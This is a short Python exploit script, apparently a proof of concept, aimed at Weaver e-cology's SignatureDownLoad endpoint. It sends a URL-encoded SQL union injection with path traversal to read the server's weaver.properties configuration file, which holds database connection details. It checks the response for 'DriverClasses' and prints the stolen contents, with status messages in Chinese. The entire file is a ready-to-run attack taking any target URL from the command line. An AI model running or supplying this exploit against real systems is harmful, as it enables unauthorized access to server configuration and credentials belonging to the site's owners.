#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import zipfile
import random
import sys
import requests

def verify(site):
    burp0_url = site + "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200 and "DriverClasses" in r.text:
        return r.text
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 weaver.properties 的内容为：", info)
    else:
        print("[-]漏洞不存在")
